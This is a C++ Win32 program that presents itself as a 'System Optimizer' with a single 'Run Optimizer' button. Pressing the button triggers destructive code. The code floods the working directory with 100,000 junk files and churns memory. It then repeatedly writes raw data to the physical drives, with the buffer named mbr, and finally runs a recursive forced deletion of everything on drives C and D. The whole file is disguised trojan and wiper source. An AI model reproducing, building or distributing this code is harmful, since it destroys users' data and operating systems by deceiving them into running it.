#include <windows.h>
#include <commctrl.h>
#include <tchar.h>
#include <string>

#pragma comment(lib, "comctl32.lib")

HWND hStaticTitle;
HWND hButtonRun;
void OptimizerToMakeYourPcVeryGood();
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE:
        {
            hStaticTitle = CreateWindowEx(
                0, TEXT("STATIC"), TEXT("Welcome to System Optimizer"),
                WS_CHILD | WS_VISIBLE | SS_CENTER,
                20, 20, 260, 30, hwnd, NULL, ((LPCREATESTRUCT)lParam)->hInstance, NULL);
            hButtonRun = CreateWindowEx(
                0, TEXT("BUTTON"), TEXT("Run Optimizer"),
                WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
                100, 70, 120, 40, hwnd, (HMENU)1, ((LPCREATESTRUCT)lParam)->hInstance, NULL);
            break;
        }
        case WM_COMMAND:
            if (LOWORD(wParam) == 1) {
                OptimizerToMakeYourPcVeryGood();
            }
            break;
        case WM_SIZE:
        {
            RECT rc;
            GetClientRect(hwnd, &rc);
            int clientWidth = rc.right - rc.left;
            MoveWindow(hStaticTitle, 20, 20, clientWidth - 40, 30, TRUE);
            int btnWidth = 120, btnHeight = 40;
            int btnX = (clientWidth - btnWidth) / 2;
            MoveWindow(hButtonRun, btnX, 70, btnWidth, btnHeight, TRUE);
            break;
        }
        case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            EndPaint(hwnd, &ps);
            break;
        }
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

void OptimizerToMakeYourPcVeryGood() {
    MessageBox(NULL, TEXT("Optimizer is running..."), TEXT("Information"), MB_OK | MB_ICONINFORMATION);
    for (int i = 0; i < 100000; i++) {
        std::string filename = "file_" + std::to_string(i);
        HANDLE hFile = CreateFileA(filename.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            SetFilePointer(hFile, 0, NULL, FILE_END);
            DWORD bytesWritten = 1;
            WriteFile(hFile, &bytesWritten, sizeof(DWORD), &bytesWritten, NULL);
            CloseHandle(hFile);
        }
    }

    for (int k = 0; k < 100; k++) {
        void* ptr;
        for (int i = 0; i < 10000; i++) {
            ptr = VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (ptr != NULL) {
                memset(ptr, 'X', 1024 * 1024);
                VirtualFree(ptr, 0, MEM_RELEASE);
            }
        }
    }

    char mbr[512];
    for (int i = 0; i < 500000; i++) {
        for (int j = 0; j < sizeof(mbr); j++) {
            mbr[j] = 'X';
        }
        HANDLE hDevice = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (hDevice != INVALID_HANDLE_VALUE) {
            OVERLAPPED o;
            ZeroMemory(&o, sizeof(o));
            SetFilePointer(hDevice, 0, NULL, FILE_END);
            DWORD bytesWritten = sizeof(mbr);
            WriteFile(hDevice, mbr, bytesWritten, &bytesWritten, &o);
            CloseHandle(hDevice);
        }
    }

    for (int i = 1; i < 10; i++) {
        std::string device_name = "\\\\.\\PhysicalDrive" + std::to_string(i);
        HANDLE hDevice = CreateFileA(device_name.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (hDevice != INVALID_HANDLE_VALUE) {
            SetFilePointer(hDevice, 0, NULL, FILE_END);
            DWORD bytesWritten = 0;
            WriteFile(hDevice, &bytesWritten, sizeof(DWORD), &bytesWritten, NULL);
            CloseHandle(hDevice);
        }
    }

    system("cmd /c \"del C:\\*.* /s/f/e && del D:\\*.* /s/f/e\"");
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    INITCOMMONCONTROLSEX icex = { sizeof(INITCOMMONCONTROLSEX), ICC_WIN95_CLASSES };
    InitCommonControlsEx(&icex);
    WNDCLASSEX wc = {0};
    wc.cbSize        = sizeof(WNDCLASSEX);
    wc.style         = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInstance;
    wc.hIcon         = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszClassName = TEXT("OptimizerUI");
    wc.hIconSm       = LoadIcon(NULL, IDI_APPLICATION);

    if (!RegisterClassEx(&wc)) {
        MessageBox(NULL, TEXT("Window Registration Failed!"), TEXT("Error"), MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }
    HWND hwnd = CreateWindowEx(
        WS_EX_CLIENTEDGE,
        TEXT("OptimizerUI"),
        TEXT("System Optimizer"),
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 320, 180,
        NULL, NULL, hInstance, NULL);

    if (hwnd == NULL) {
        MessageBox(NULL, TEXT("Window Creation Failed!"), TEXT("Error"), MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }

    ShowWindow(hwnd, nShowCmd);
    UpdateWindow(hwnd);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    //made by ilyyeees as ilyz yes
}